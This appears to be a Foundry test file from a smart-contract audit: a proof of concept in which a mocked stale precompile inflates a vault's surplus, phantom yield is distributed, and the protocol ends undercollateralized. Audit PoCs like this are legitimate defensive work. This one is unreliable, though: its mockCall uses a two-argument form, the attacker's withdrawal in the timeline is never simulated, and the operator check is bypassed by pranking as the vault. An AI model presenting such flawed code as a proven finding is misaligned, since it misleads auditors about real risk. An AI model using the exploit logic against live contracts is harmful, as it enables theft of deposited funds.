// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Inherit ToL1WeiHarness to use the fully deployed protocol state.
// 2. [T=0] User deposits 100,000 USDC into the vault, establishing totalSupply and baseline backing.
// 3. [T=1] Attacker withdraws their L1 assets. We simulate the "stale precompile" by mocking the HyperCore precompile (0x80F) to still return the old, high equity value.
// 4. [T=2] Operator calls settle() during the latency window. The accountant reads the stale precompile, calculates an artificially inflated surplus, and distributes phantom yield.
// 5. [T=3] Precompile latency window expires. We clear the mock to reflect the true L1 state (assets withdrawn).
// 6. [Assert] Verify that the surplus drops below zero, proving the protocol is now undercollateralized due to the phantom yield distribution.

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // 1. Setup: Deposit into vault to establish totalSupply
        _depositAs(user1, 100_000e6);

        int256 initialSurplus = accountant.surplus();
        console.log("Step 1: initialSurplus =", int256(initialSurplus));

        // 2. Attacker withdraws on L1, but precompile is stale.
        // We mock the PRECOMPILE_ACCOUNT_MARGIN_SUMMARY (0x80F) to return inflated equity.
        address precompileMargin = address(0x80F);

        // Mock the precompile to return a massive equity value (e.g., 1,000,000 USDC)
        // The precompile returns an int256 or uint256 depending on the exact interface, 
        // but abi.encode(int256(1_000_000e6)) will match the expected return size.
        bytes memory mockReturn = abi.encode(int256(1_000_000e6));
        vm.mockCall(precompileMargin, mockReturn);

        // 3. Verify surplus is artificially inflated
        int256 inflatedSurplus = accountant.surplus();
        console.log("Step 2: inflatedSurplus =", int256(inflatedSurplus));
        assertGt(inflatedSurplus, initialSurplus, "Surplus should be inflated by stale precompile");

        // 4. Operator calls settleDailyPnL to distribute the phantom yield
        uint256 proposedYield = uint256(inflatedSurplus);

        // Prank as the vault to call settleDailyPnL directly (bypassing operator ACL for PoC simplicity)
        vm.prank(address(vault));
        uint256 distributable = accountant.settleDailyPnL(proposedYield);
        console.log("Step 3: distributable phantom yield =", distributable);

        assertGt(distributable, 0, "Should distribute phantom yield");

        // 5. Precompile latency window expires -> real L1 state is reflected (assets are gone)
        vm.clearMockedCalls();

        int256 realSurplus = accountant.surplus();
        console.log("Step 4: realSurplus after precompile update =", int256(realSurplus));

        // 6. Assert the protocol is now undercollateralized
        assertLt(realSurplus, 0, "Protocol should be undercollateralized after precompile updates");
    }
}
